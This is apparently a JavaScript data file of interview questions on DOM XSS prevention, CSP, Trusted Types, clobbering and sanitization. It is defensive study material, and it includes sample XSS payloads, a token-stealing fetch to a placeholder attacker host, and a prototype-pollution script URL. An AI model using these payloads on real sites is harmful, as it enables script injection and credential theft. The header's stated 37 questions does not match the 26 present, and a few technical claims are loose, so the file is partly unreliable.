// scripts/dom-gen/part5-b.cjs
// 37 Unique Questions on DOM Security, XSS Prevention, Sanitization & Safe DOM Sinks
// Distribution: 5 EASY, 20 INTERMEDIATE, 12 DIFFICULT

module.exports = [
  // --- 5 EASY Questions ---
  {
    topic: "DOM Security & XSS Prevention",
    subtopic: "DOM-Based XSS Definition",
    difficulty: "EASY",
    questionType: "SECURITY",
    question: "What is DOM-based Cross-Site Scripting (DOM XSS) and how does it occur?",
    shortAnswer: "DOM XSS occurs when client-side JavaScript reads data from an untrusted source (like location.search or hash) and writes it into an unsafe DOM sink (like innerHTML or eval) without sanitization.",
    detailedExplanation: "- **Client-Side Only**: Does not require the server to reflect malicious payloads; the vulnerability exists entirely in client-side JavaScript.\n- **Sources**: `location.search`, `location.hash`, `document.referrer`, `localStorage`, `postMessage`.\n- **Sinks**: `element.innerHTML`, `outerHTML`, `document.write()`, `location.href`.\n- **Prevention**: Use `element.textContent` or strict sanitization libraries like DOMPurify.",
    codeExample: "// VULNERABLE TO DOM XSS:\nconst params = new URLSearchParams(window.location.search);\nconst username = params.get('user'); // Source\n// Injects malicious script directly into DOM:\ndocument.querySelector('#greeting').innerHTML = `Hello ${username}`; // Sink!\n\n// SAFE FIX:\ndocument.querySelector('#greeting').textContent = `Hello ${username}`;",
    interviewTips: ["Always define DOM XSS using the 'Source -> Sink' concept: untrusted source flowing directly into an executable DOM sink."]
  },
  {
    topic: "DOM Security & XSS Prevention",
    subtopic: "innerHTML vs textContent for User Input",
    difficulty: "EASY",
    questionType: "COMPARISON",
    question: "Why should you never use innerHTML to insert user-submitted text into the DOM?",
    shortAnswer: "`innerHTML` parses string content as executable HTML markup, allowing attackers to inject malicious `<img onerror=\"...\">` or `<script>` tags, whereas `textContent` treats all input strictly as inert plain text.",
    detailedExplanation: "- **Markup Parsing**: `innerHTML` invokes the browser's HTML parser; if user text contains `<img src=x onerror=alert(1)>`, the script executes.\n- **Plain Text Safety**: `textContent` escapes characters automatically, rendering `<` as `&lt;` on screen without execution.\n- **Performance**: `textContent` is also significantly faster because it bypasses the HTML parser.",
    codeExample: "const commentText = '<img src=x onerror=\"stealCookies()\">';\n\n// DANGEROUS (executes script via image onerror):\n// container.innerHTML = commentText;\n\n// 100% SAFE (renders string literally on screen):\ncontainer.textContent = commentText;",
    interviewTips: ["Use the `<img src=x onerror=...>` example because modern browsers block `<script>` inside `innerHTML`, making `onerror` the primary vector."]
  },
  {
    topic: "DOM Security & XSS Prevention",
    subtopic: "Safe External Links: rel='noopener noreferrer'",
    difficulty: "EASY",
    questionType: "SECURITY",
    question: "Why is rel='noopener noreferrer' essential when creating links with target='_blank'?",
    shortAnswer: "It prevents the newly opened tab from accessing the opening window via `window.opener`, protecting against reverse tabnabbing attacks where the child tab redirects your app to a phishing page.",
    detailedExplanation: "- **Reverse Tabnabbing**: Without `noopener`, the opened page can run `window.opener.location = 'https://fake-login.com'`, silently phishing the user.\n- **Modern Browser Default**: Modern evergreen browsers automatically imply `rel=\"noopener\"` on `target=\"_blank\"`, but explicitly writing it remains best practice.\n- **noreferrer**: Also omits the HTTP `Referer` header to avoid leaking sensitive URLs in tokens.",
    codeExample: "<!-- Secure external link: -->\n<a \n  href=\"https://external-resource.com\" \n  target=\"_blank\" \n  rel=\"noopener noreferrer\"\n>\n  Visit Partner Site\n</a>",
    interviewTips: ["Mention 'reverse tabnabbing' and `window.opener.location` manipulation as the core threat."]
  },
  {
    topic: "DOM Security & XSS Prevention",
    subtopic: "Dangerous DOM Sinks: document.write()",
    difficulty: "EASY",
    questionType: "SECURITY",
    question: "Why is document.write() considered an obsolete and dangerous DOM API?",
    shortAnswer: "`document.write()` is a high-risk XSS sink that blocks HTML parsing, delays page rendering, and if executed after page load, completely wipes out the entire existing document.",
    detailedExplanation: "- **Document Wiping**: Calling `document.write()` after the document has finished loading implicitly calls `document.open()`, erasing all existing DOM elements.\n- **Parser Blocking**: Forces the HTML parser to pause and wait, hurting Core Web Vitals.\n- **Interventions**: Modern browsers block `document.write()` script injections on slow 2G/3G connections.",
    codeExample: "// DANGEROUS & DEPRECATED:\n// document.write('<p>User: ' + location.search + '</p>');\n\n// MODERN & SAFE:\nconst p = document.createElement('p');\np.textContent = `User: ${location.search}`;\ndocument.body.appendChild(p);",
    interviewTips: ["State that `document.write()` wipes out the entire HTML document if invoked after the page has loaded."]
  },
  {
    topic: "DOM Security & XSS Prevention",
    subtopic: "Sanitizing href and src Attributes (javascript: URIs)",
    difficulty: "EASY",
    questionType: "SECURITY",
    question: "How can user-provided URLs in <a href> or <iframe src> execute malicious code even without <script> tags?",
    shortAnswer: "Attackers can provide a URL starting with the `javascript:` pseudo-protocol (e.g. `javascript:alert(document.cookie)`), which executes arbitrary JavaScript when the link is clicked.",
    detailedExplanation: "- **javascript: Execution**: Clicking `<a href=\"javascript:attack()\">` executes script in the current page's origin.\n- **Data URIs**: `data:text/html,...` can similarly load untrusted HTML in iframes.\n- **Protocol Whitelisting**: Always validate that URLs start with approved protocols: `http://`, `https://`, or `mailto:`.",
    codeExample: "function isSafeUrl(url) {\n  try {\n    const parsed = new URL(url, window.location.origin);\n    return ['http:', 'https:', 'mailto:'].includes(parsed.protocol);\n  } catch {\n    return false; // Malformed URL\n  }\n}\n\n// Safe link assignment:\nif (isSafeUrl(userSuppliedUrl)) {\n  linkElement.href = userSuppliedUrl;\n} else {\n  linkElement.href = '#';\n}",
    interviewTips: ["Always emphasize validating URL protocols (`http:` and `https:`) using the native `new URL()` constructor."]
  },

  // --- 20 INTERMEDIATE Questions ---
  {
    topic: "DOM Security & XSS Prevention",
    subtopic: "HTML Sanitizer API (element.setHTML)",
    difficulty: "INTERMEDIATE",
    questionType: "SECURITY",
    question: "What is the native HTML Sanitizer API and how does element.setHTML() improve on innerHTML?",
    shortAnswer: "The Sanitizer API allows safe HTML insertion by parsing and automatically stripping out executable scripts, event handlers (`onclick`, `onerror`), and unsafe tags before inserting nodes into the DOM.",
    detailedExplanation: "- **Native Browser Engine**: Built directly into the browser, eliminating the need for 50KB third-party libraries like DOMPurify.\n- **Safe Sinks**: Replaces `element.innerHTML = html` with `element.setHTML(html, { sanitizer })`.\n- **Configurable**: Allows specifying custom `allowElements`, `blockElements`, and `allowAttributes` rules.",
    codeExample: "const untrustedInput = '<p>Hello <script>stealData()</script><img src=x onerror=alert(1)></p>';\n\nconst container = document.querySelector('#safe-container');\n\n// Native Sanitizer strips script and onerror attributes automatically:\nif ('setHTML' in container) {\n  container.setHTML(untrustedInput);\n  // Resulting DOM: <p>Hello <img src=\"x\"></p>\n}",
    interviewTips: ["Highlight the native Sanitizer API as the future web standard that replaces third-party libraries like DOMPurify."]
  },
  {
    topic: "DOM Security & XSS Prevention",
    subtopic: "Trusted Types API Overview",
    difficulty: "INTERMEDIATE",
    questionType: "SECURITY",
    question: "What is the Trusted Types API and how does it prevent DOM-based XSS at the browser level?",
    shortAnswer: "Trusted Types locks down dangerous DOM sinks (like innerHTML and script.src) so they reject raw strings, requiring values to be wrapped in certified `TrustedHTML` or `TrustedScriptURL` objects generated by approved policies.",
    detailedExplanation: "- **Enforcement via CSP**: Activated by the HTTP header `Content-Security-Policy: require-trusted-types-for 'script'`.\n- **Type Safety**: Attempting `element.innerHTML = 'raw string'` throws a `TypeError` in the browser console.\n- **Centralized Policies**: Sanitization logic is centralized into audited policies created via `trustedTypes.createPolicy()`.",
    codeExample: "// Creating a Trusted Types policy:\nif (window.trustedTypes && window.trustedTypes.createPolicy) {\n  const escapePolicy = window.trustedTypes.createPolicy('my-escape-policy', {\n    createHTML: (string) => DOMPurify.sanitize(string)\n  });\n\n  // Passes certified TrustedHTML to the sink:\n  container.innerHTML = escapePolicy.createHTML(untrustedUserInput);\n}",
    interviewTips: ["Trusted Types is considered the holy grail of DOM XSS prevention by security teams at Google and Microsoft."]
  },
  {
    topic: "DOM Security & XSS Prevention",
    subtopic: "DOM Clobbering Explained",
    difficulty: "INTERMEDIATE",
    questionType: "SECURITY",
    question: "What is DOM Clobbering and how can HTML elements overwrite global JavaScript variables?",
    shortAnswer: "DOM Clobbering occurs when HTML markup containing `id` or `name` attributes (like `<form id=\"config\">` or `<a id=\"admin\">`) creates properties on the `window` or `document` object, overwriting global JavaScript variables.",
    detailedExplanation: "- **Legacy Feature**: Named elements are automatically exposed as properties on `window` and `document` (e.g. `window.myId`).\n- **Exploitation**: An attacker injects `<a id=\"apiConfig\" href=\"https://attacker.com\">` to overwrite `window.apiConfig`, redirecting data fetches.\n- **Defense**: Explicitly declare variables (`const`, `let`), verify types with `instanceof`, or use `Object.freeze()` on configurations.",
    codeExample: "<!-- Injected user comment markup: -->\n<a id=\"appConfig\" href=\"https://evil-server.com/api\"></a>\n\n<script>\n// Vulnerable fallback pattern:\n// const endpoint = window.appConfig || 'https://real-server.com/api';\n// endpoint will be clobbered by the <a> element!\n\n// Safe approach:\nconst endpoint = (typeof appConfig === 'object' && appConfig.url) ? appConfig.url : 'https://real-server.com/api';\n</script>",
    interviewTips: ["Explain that DOM Clobbering abuses the browser's legacy behavior of creating global `window` properties from element `id` attributes."]
  },
  {
    topic: "DOM Security & XSS Prevention",
    subtopic: "Content Security Policy (CSP) & DOM Script Execution",
    difficulty: "INTERMEDIATE",
    questionType: "SECURITY",
    question: "How does a Content Security Policy (CSP) restrict inline scripts and unsafe DOM manipulation?",
    shortAnswer: "A strict CSP using `script-src 'nonce-...'` blocks all inline `<script>` tags, inline event attributes (`onclick`), and strings in `eval()` or `setTimeout()`, neutralizing injected script payloads.",
    detailedExplanation: "- **Default Blocking**: Disallows inline scripts unless accompanied by a cryptographically random cryptographic nonce matching the HTTP header.\n- **Disabling eval**: `unsafe-eval` directive is blocked by default, neutralizing string execution sinks.\n- **Reporting**: `report-to` or `report-uri` headers log policy violations to server telemetry in real-time.",
    codeExample: "<!-- HTTP Header: -->\n<!-- Content-Security-Policy: script-src 'nonce-rAnd0m123' 'strict-dynamic'; -->\n\n<!-- Authorized script runs: -->\n<script nonce=\"rAnd0m123\" src=\"/bundle.js\"></script>\n\n<!-- Injected attacker script BLOCKED by browser: -->\n<!-- <script>stealCredentials()</script> -->",
    interviewTips: ["Mention that CSP acts as a defense-in-depth barrier that prevents injected XSS from executing even if a DOM sink was compromised."]
  },
  {
    topic: "DOM Security & XSS Prevention",
    subtopic: "DOMParser XSS Hazards",
    difficulty: "INTERMEDIATE",
    questionType: "SECURITY",
    question: "Is DOMParser().parseFromString(html, 'text/html') inherently safe from XSS?",
    shortAnswer: "No, while DOMParser creates an inactive document without executing scripts immediately, inserting the parsed nodes into the active document (or parsing payloads with image onerror attributes) will execute malicious scripts.",
    detailedExplanation: "- **Inactive Context**: Scripts inside `DOMParser` do not execute during `parseFromString()`.\n- **Activation on Insertion**: As soon as you call `document.body.appendChild(parsedNode)` or access `.innerHTML`, inline event handlers (`onload`, `onerror`) execute.\n- **Sanitization Still Required**: You must sanitize the resulting node tree before attaching it to the live DOM.",
    codeExample: "const parser = new DOMParser();\nconst doc = parser.parseFromString('<img src=invalid onerror=alert(1)>', 'text/html');\n\n// DANGEROUS: Appending the parsed element triggers the onerror script!\n// document.body.appendChild(doc.body.firstElementChild);",
    interviewTips: ["Clarify that `DOMParser` parses HTML, but does NOT sanitize it; attaching the output to the active document executes any handlers."]
  },
  {
    topic: "DOM Security & XSS Prevention",
    subtopic: "HTML iframe sandbox Attribute",
    difficulty: "INTERMEDIATE",
    questionType: "SECURITY",
    question: "How does the iframe sandbox attribute prevent untrusted third-party DOM widgets from attacking your site?",
    shortAnswer: "The `sandbox` attribute applies strict security restrictions on the iframe content, disabling script execution, form submissions, popups, and same-origin cookies unless explicitly re-enabled via permission tokens.",
    detailedExplanation: "- **Maximum Isolation (`sandbox=\"\"`)**: Treats the iframe as a unique origin, disables scripts, prevents form submission, and blocks top-navigation.\n- **Granular Permissions**: `allow-scripts` (run JS), `allow-same-origin` (access cookies/storage), `allow-forms` (submit forms).\n- **Critical Caution**: NEVER combine `allow-scripts` and `allow-same-origin` on untrusted content, because script inside the iframe can programmatically remove the sandbox attribute.",
    codeExample: "<!-- Secure sandboxed iframe for rendering untrusted user widgets: -->\n<iframe \n  src=\"/user-embed.html\" \n  sandbox=\"allow-scripts\"\n  title=\"Untrusted Widget Preview\"\n></iframe>",
    interviewTips: ["Highlight the golden rule: never combine `allow-scripts` with `allow-same-origin` on untrusted iframe sources."]
  },
  {
    topic: "DOM Security & XSS Prevention",
    subtopic: "Subresource Integrity (SRI)",
    difficulty: "INTERMEDIATE",
    questionType: "SECURITY",
    question: "What is Subresource Integrity (SRI) and how does it prevent CDN-compromised DOM attacks?",
    shortAnswer: "SRI verifies that files fetched from third-party CDNs (like `<script>` or `<link>`) match a cryptographic base64 hash (`integrity=\"sha384-...\"`), causing the browser to reject the script if modified by attackers.",
    detailedExplanation: "- **CDN Compromise Defense**: If an attacker hacks a public CDN and modifies a JavaScript library, SRI blocks the script from running in your users' browsers.\n- **Hash Verification**: Browser calculates the cryptographic SHA hash of the downloaded bytes and compares it to the `integrity` attribute.\n- **CORS Requirement**: External scripts using SRI must also have `crossorigin=\"anonymous\"`.",
    codeExample: "<script \n  src=\"https://cdn.example.com/library.min.js\" \n  integrity=\"sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC\" \n  crossorigin=\"anonymous\"\n></script>",
    interviewTips: ["Mention that SRI requires `crossorigin=\"anonymous\"` to allow cross-origin hash verification."]
  },
  {
    topic: "DOM Security & XSS Prevention",
    subtopic: "Safe DocumentFragment Sanitization Pattern",
    difficulty: "INTERMEDIATE",
    questionType: "CODE",
    question: "How do you safely render rich markdown-generated HTML using DOMPurify before inserting it into the DOM?",
    shortAnswer: "Pass the raw HTML string to `DOMPurify.sanitize(dirtyHtml, { RETURN_DOM_FRAGMENT: true })` and append the returned safe DocumentFragment directly to the DOM.",
    detailedExplanation: "- **RETURN_DOM_FRAGMENT**: Avoids re-serializing to a string and re-parsing with `innerHTML`.\n- **Atomic Insertion**: DocumentFragment inserts all sanitized nodes in a single layout operation.\n- **Hook Extensibility**: DOMPurify allows custom hooks to enforce `rel=\"noopener\"` on all sanitized anchor links automatically.",
    codeExample: "import DOMPurify from 'dompurify';\n\nfunction renderMarkdownHtml(dirtyHtml, container) {\n  // Sanitizes and returns safe DocumentFragment directly:\n  const safeFragment = DOMPurify.sanitize(dirtyHtml, {\n    RETURN_DOM_FRAGMENT: true\n  });\n  \n  container.replaceChildren(safeFragment); // Clean, safe atomic insertion\n}",
    interviewTips: ["Recommend `RETURN_DOM_FRAGMENT: true` in DOMPurify as best practice for maximum performance and security."]
  },
  {
    topic: "DOM Security & XSS Prevention",
    subtopic: "Clickjacking & Framebusting Defense",
    difficulty: "INTERMEDIATE",
    questionType: "SECURITY",
    question: "What is Clickjacking and how does Content-Security-Policy frame-ancestors protect DOM interfaces from being invisibly framed?",
    shortAnswer: "Clickjacking tricks users into clicking disguised interactive buttons by embedding the victim site inside a transparent iframe; the `Content-Security-Policy: frame-ancestors 'none'` header blocks unauthorized sites from embedding your page.",
    detailedExplanation: "- **Attack Mechanism**: Attacker overlays an invisible iframe of your banking or settings page on top of an appealing game button.\n- **CSP frame-ancestors**: Replaces the obsolete `X-Frame-Options: DENY` header with granular domain policies.\n- **frame-ancestors 'self'**: Allows framing only within your own domain's portals.",
    codeExample: "<!-- Modern HTTP Response Header: -->\n<!-- Content-Security-Policy: frame-ancestors 'none'; -->\n\n<!-- Legacy HTTP Response Header fallback: -->\n<!-- X-Frame-Options: DENY -->",
    interviewTips: ["Clarify that `frame-ancestors` in CSP is the modern standard replacing the legacy `X-Frame-Options` header."]
  },
  {
    topic: "DOM Security & XSS Prevention",
    subtopic: "Preventing Form Action Hijacking",
    difficulty: "INTERMEDIATE",
    questionType: "SECURITY",
    question: "How can malicious input modify a form's action attribute and how do you protect against form hijacking?",
    shortAnswer: "Attackers can manipulate the `form.action` attribute or use submit buttons with `formaction=\"https://evil.com\"` to divert sensitive credentials; validate actions before submission and restrict targets using CSP `form-action`.",
    detailedExplanation: "- **formaction Attribute**: An injected `<button formaction=\"https://attacker.com\">` overrides the form's normal destination.\n- **CSP form-action**: Restricts endpoints where forms are allowed to post data (`Content-Security-Policy: form-action 'self' https://api.mysite.com`).\n- **Client Verification**: Inspect `e.submitter.formAction` in the `submit` event handler.",
    codeExample: "form.addEventListener('submit', (e) => {\n  const submitter = e.submitter;\n  const targetUrl = submitter?.formAction || form.action;\n  \n  if (!isWhitelistedDomain(targetUrl)) {\n    e.preventDefault();\n    console.error('Unauthorized form submission destination blocked.');\n  }\n});",
    interviewTips: ["Mention the `formaction` button attribute and the CSP `form-action` directive."]
  },
  {
    topic: "DOM Security & XSS Prevention",
    subtopic: "Safe JSON Parsing from DOM Data Attributes",
    difficulty: "INTERMEDIATE",
    questionType: "CODE",
    question: "How do you safely parse JSON data stored in a DOM data-* attribute without breaking on malicious quotes or malformed syntax?",
    shortAnswer: "Wrap `JSON.parse(element.getAttribute('data-config'))` in a `try...catch` block and ensure server-rendered JSON is escaped against script context breakout.",
    detailedExplanation: "- **HTML Escaping**: When servers output JSON into HTML attributes, quotes must be escaped as `&quot;` to prevent attribute boundary breakout.\n- **try/catch Safety**: Avoids uncaught syntax errors from crashing execution when attributes are corrupted.\n- **Valid Types**: Ensure the parsed result is an object before accessing properties.",
    codeExample: "function parseDataConfig(element) {\n  const raw = element.getAttribute('data-config');\n  if (!raw) return null;\n  try {\n    const data = JSON.parse(raw);\n    return typeof data === 'object' && data !== null ? data : null;\n  } catch (err) {\n    console.warn('Malformed JSON in data-config attribute:', err);\n    return null;\n  }\n}",
    interviewTips: ["Remind the interviewer that JSON inside HTML attributes requires `&quot;` escaping on the server."]
  },
  {
    topic: "DOM Security & XSS Prevention",
    subtopic: "Session Storage vs Local Storage for Sensitive DOM State",
    difficulty: "INTERMEDIATE",
    questionType: "SECURITY",
    question: "Why should sensitive authentication tokens never be stored in localStorage or sessionStorage in a DOM context?",
    shortAnswer: "Any script running on the page (including third-party analytics, ads, or XSS payloads) has unrestricted synchronous read access to `localStorage` and `sessionStorage`. Store tokens in `HttpOnly` cookies instead.",
    detailedExplanation: "- **Complete Exposure**: An attacker executing just one line of XSS can extract all tokens via `fetch('attacker.com?k=' + localStorage.getItem('token'))`.\n- **HttpOnly Protection**: Browsers block client-side JavaScript from reading cookies marked with the `HttpOnly` flag entirely.\n- **Refresh Tokens**: Store access tokens in short-lived memory variables and refresh tokens in HttpOnly secure cookies.",
    codeExample: "// BAD (Vulnerable to instant theft via any DOM XSS injection):\n// localStorage.setItem('authToken', token);\n\n// GOOD (Managed by server via HTTP headers):\n// Set-Cookie: token=xyz; Secure; HttpOnly; SameSite=Strict",
    interviewTips: ["State firmly: 'Tokens in localStorage are always vulnerable to XSS. HttpOnly cookies cannot be read by JavaScript.'"]
  },
  {
    topic: "DOM Security & XSS Prevention",
    subtopic: "Securing SVG Injections in the DOM",
    difficulty: "INTERMEDIATE",
    questionType: "SECURITY",
    question: "Why is inserting user-uploaded SVG files directly into the DOM using innerHTML dangerous?",
    shortAnswer: "SVG is an XML-based document format that natively supports executable `<script>` tags, inline event attributes (`onload`), and external entity requests, making raw SVG injection a direct XSS vector.",
    detailedExplanation: "- **Executable XML**: Unlike JPEG or PNG, SVG markup can contain `<script>alert('XSS')</script>` which executes when injected via `innerHTML`.\n- **Inline Handlers**: `<svg onload=\"alert(1)\">` fires immediately upon DOM insertion.\n- **Safe Rendering**: Display user SVGs using `<img src=\"user.svg\">` (which disables script execution) instead of embedding raw SVG XML.",
    codeExample: "<!-- SAFE: Disables scripts and interactions inside SVG automatically -->\n<img src=\"user-avatar.svg\" alt=\"User Avatar\">\n\n<!-- DANGEROUS: Executes any <script> embedded inside the SVG file -->\n<!-- container.innerHTML = rawSvgXmlString; -->",
    interviewTips: ["Key takeaway: Always render user SVGs via `<img>` tags, never inline with `innerHTML`."]
  },
  {
    topic: "DOM Security & XSS Prevention",
    subtopic: "MutationObserver for Security Monitoring (DOM Integrity)",
    difficulty: "INTERMEDIATE",
    questionType: "SECURITY",
    question: "How can a MutationObserver be used as a client-side tamper detection mechanism against malicious script injection?",
    shortAnswer: "Observe `document.head` and `document.body` for `childList` additions and verify that any dynamically added `<script>` or `<iframe>` tags have approved URLs and valid nonces.",
    detailedExplanation: "- **Real-time Monitoring**: Intercepts unauthorized scripts inserted by rogue browser extensions or compromised third-party vendor tags.\n- **Instant Removal**: Unapproved nodes can be immediately removed with `node.remove()`.\n- **Telemetry**: Report detected tamper events back to security monitoring endpoints.",
    codeExample: "const securityObserver = new MutationObserver((mutations) => {\n  for (const mutation of mutations) {\n    for (const node of mutation.addedNodes) {\n      if (node.tagName === 'SCRIPT' && !isApprovedScript(node)) {\n        node.remove(); // Neutralizes unauthorized script immediately\n        reportSecurityViolation(node.src || 'inline');\n      }\n    }\n  }\n});\nsecurityObserver.observe(document.documentElement, { childList: true, subtree: true });",
    interviewTips: ["Discuss MutationObserver for tamper detection when asked about frontend defense-in-depth strategies."]
  },
  {
    topic: "DOM Security & XSS Prevention",
    subtopic: "CSP script-src-elem vs script-src-attr",
    difficulty: "INTERMEDIATE",
    questionType: "SECURITY",
    question: "What is the difference between script-src-elem and script-src-attr in Content Security Policy Level 3?",
    shortAnswer: "`script-src-elem` controls explicit `<script>` elements, while `script-src-attr` controls inline event handler attributes like `onclick` or `onload`.",
    detailedExplanation: "- **Granular Control**: Allows allowing external script files via nonce while strictly forbidding all inline `onclick` attributes across the application.\n- **Zero-Tolerance for Inline Handlers**: Setting `script-src-attr 'none'` prevents all HTML event handler injections.\n- **CSP Level 3**: Provides finer granularity than the monolithic `script-src` directive.",
    codeExample: "/* CSP Level 3 Header allowing nonced scripts while completely disabling onclick attributes: */\n/* Content-Security-Policy: script-src-elem 'nonce-xyz'; script-src-attr 'none'; */",
    interviewTips: ["Mention `script-src-attr 'none'` as the cleanest way to enforce modern `addEventListener` usage across an entire organization."]
  },

  // --- 12 DIFFICULT Questions ---
  {
    topic: "DOM Security & XSS Prevention",
    subtopic: "DOM Clobbering Form Action and Children Arrays",
    difficulty: "DIFFICULT",
    questionType: "SECURITY",
    question: "How can an attacker clobber form.submit or form.reset using input name attributes?",
    shortAnswer: "If an `<input>` or `<button>` inside a `<form>` has `name=\"submit\"` or `name=\"reset\"`, the native methods `form.submit()` and `form.reset()` are overwritten by the input DOM element reference, causing script calls to throw a TypeError.",
    detailedExplanation: "- **Named Form Controls**: Form elements expose child controls as direct named properties (e.g. `form.elements['submit']` and `form.submit`).\n- **Method Shadowing**: The native method `form.submit` is replaced by the `<input name=\"submit\">` DOM element.\n- **Prototype Invocation**: To bypass this clobbering, call the method from the prototype: `HTMLFormElement.prototype.submit.call(form)`.",
    codeExample: "<!-- Injected markup: -->\n<form id=\"myForm\">\n  <input type=\"text\" name=\"submit\" value=\"attacker\">\n</form>\n\n<script>\nconst form = document.querySelector('#myForm');\n// FAILS: form.submit is an HTMLInputElement, not a function!\n// form.submit(); // TypeError: form.submit is not a function\n\n// RESILIENT BYPASS:\nHTMLFormElement.prototype.submit.call(form);\n</script>",
    interviewTips: ["Demonstrate senior mastery by invoking `HTMLFormElement.prototype.submit.call(form)` to defeat form method clobbering."]
  },
  {
    topic: "DOM Security & XSS Prevention",
    subtopic: "Prototype Pollution Leading to DOM XSS",
    difficulty: "DIFFICULT",
    questionType: "SECURITY",
    question: "How can JavaScript Prototype Pollution escalate into a full client-side DOM XSS vulnerability?",
    shortAnswer: "Polluting `Object.prototype` injects attacker-controlled properties into uninitialized object configuration options (like script URLs or template strings) that flow directly into DOM sinks like `script.src` or `innerHTML`.",
    detailedExplanation: "- **Payload Injection**: Attacker pollutes `Object.prototype.src = 'https://attacker.com/evil.js'` via a recursive merge vulnerability.\n- **Vulnerable Code**: Code doing `const s = document.createElement('script'); if (options.src) s.src = options.src;` finds `options.src` on the prototype.\n- **Mitigation**: Use `Object.create(null)` for dictionary options, `Object.freeze(Object.prototype)`, or Map data structures.",
    codeExample: "// Prototype pollution payload injected via URL query params:\n// ?__proto__[transportUrl]=https://evil.com/logger.js\n\nfunction loadAnalyticsWidget(config = {}) {\n  const script = document.createElement('script');\n  // If config.transportUrl is undefined, it inherits the polluted prototype value!\n  script.src = config.transportUrl || '/default-logger.js';\n  document.head.appendChild(script);\n}",
    interviewTips: ["Explain the escalation chain: Prototype Pollution -> Unset option fallback -> Dangerous DOM sink = DOM XSS."]
  },
  {
    topic: "DOM Security & XSS Prevention",
    subtopic: "Enforcing Trusted Types with Default Policies",
    difficulty: "DIFFICULT",
    questionType: "SECURITY",
    question: "What is the 'default' policy in Trusted Types and why should it be used with caution?",
    shortAnswer: "The 'default' policy automatically sanitizes raw strings passed to DOM sinks when no explicit policy was specified, acting as a fallback for legacy libraries but potentially hiding improper unreviewed sink usage.",
    detailedExplanation: "- **Automatic Fallback**: If code calls `element.innerHTML = rawString` under Trusted Types enforcement, the engine automatically passes `rawString` to the `default` policy's `createHTML` method.\n- **Legacy Migration**: Essential for migrating large codebases with third-party libraries that don't support Trusted Types yet.\n- **Security Trade-off**: If the default policy is too permissive, it defeats the architectural auditability that Trusted Types is designed to provide.",
    codeExample: "if (window.trustedTypes && trustedTypes.createPolicy) {\n  trustedTypes.createPolicy('default', {\n    createHTML(string) {\n      return DOMPurify.sanitize(string);\n    },\n    createScriptURL(url) {\n      if (isAllowedCdn(url)) return url;\n      throw new Error(`Untrusted script URL blocked: ${url}`);\n    }\n  });\n}",
    interviewTips: ["Describe the 'default' policy as a transitional migration bridge for legacy third-party dependencies."]
  },
  {
    topic: "DOM Security & XSS Prevention",
    subtopic: "PostMessage DOM Injection Security",
    difficulty: "DIFFICULT",
    questionType: "SECURITY",
    question: "What security validations are mandatory when handling window.postMessage before performing DOM updates?",
    shortAnswer: "You must strictly verify `event.origin` against an exact whitelist string, check that `event.source` is the expected window, and validate payload schema before modifying the DOM.",
    detailedExplanation: "- **Origin Spoofing**: Omitting `if (event.origin !== 'https://trusted.com') return;` allows ANY malicious website in another tab or iframe to send commands.\n- **Wildcard Danger**: Never pass `'*'` as `targetOrigin` when sending sensitive messages.\n- **Payload Injection**: Never write `event.data` directly into `innerHTML` or `location.href` without sanitization.",
    codeExample: "window.addEventListener('message', (event) => {\n  // 1. Mandatory exact origin check (no regex without anchoring):\n  if (event.origin !== 'https://app.verified-partner.com') return;\n  \n  // 2. Validate data structure:\n  if (event.data?.type === 'UPDATE_USER_BADGE') {\n    const badge = document.querySelector('#badge');\n    badge.textContent = String(event.data.badgeName); // Text only, never innerHTML\n  }\n});",
    interviewTips: ["Number one rule of `postMessage`: ALWAYS verify `event.origin` before doing anything else."]
  },
  {
    topic: "DOM Security & XSS Prevention",
    subtopic: "DOM Sanitization Mutation Quirks (mXSS)",
    difficulty: "DIFFICULT",
    questionType: "SECURITY",
    question: "What is Mutation XSS (mXSS) and how does browser DOM serialization cause it?",
    shortAnswer: "Mutation XSS occurs when a seemingly safe HTML string is altered or reorganized during the browser's internal HTML parsing and serialization cycle, converting inert markup into an active executable XSS payload.",
    detailedExplanation: "- **Parsing Discrepancies**: Different engines normalize malformed tags, math/svg namespaces, or foreign content differently.\n- **The Trap**: A sanitizer parses HTML, declares it safe, and serializes it to a string. When assigned to `element.innerHTML`, the browser parses it differently, activating hidden script payloads.\n- **Defense**: Use modern sanitizers (like DOMPurify with mXSS protection) or use the native Sanitizer API that operates directly on node trees.",
    codeExample: "<!-- Concept of mXSS: Malformed XML namespace alters tag hierarchy after parsing -->\n<!-- <listing>&lt;img src=x onerror=alert(1)&gt;</listing> -->\n<!-- Browser serializer unpacks entities into live tags during assignment -->",
    interviewTips: ["Explain that mXSS happens when the browser's own HTML parser mutates sanitized markup into executable code."]
  },
  {
    topic: "DOM Security & XSS Prevention",
    subtopic: "CSP nonce Guessing & Nonce Reuse Hazards",
    difficulty: "DIFFICULT",
    questionType: "SECURITY",
    question: "Why must a CSP nonce be cryptographically random and unique for every single HTTP request?",
    shortAnswer: "If a nonce is reused, cached, or predictable, an attacker can extract the known nonce and append it to an injected `<script nonce=\"...\">` tag, completely bypassing CSP protections.",
    detailedExplanation: "- **Cryptographic Generation**: Must be generated by a cryptographically secure pseudo-random number generator (CSPRNG) with at least 128 bits of entropy.\n- **Per-Request Freshness**: Each HTTP response must have a unique nonce that is never reused.\n- **Cache Exclusion**: Responses with nonces must declare `Cache-Control: no-store` to prevent caching proxies from sharing nonces across users.",
    codeExample: "// Server-side pseudocode for CSP nonce generation:\n// const nonce = crypto.randomBytes(16).toString('base64');\n// res.setHeader('Content-Security-Policy', `script-src 'nonce-${nonce}'`);",
    interviewTips: ["State that cached or static nonces completely defeat CSP security because attackers can simply copy the static nonce."]
  }
];
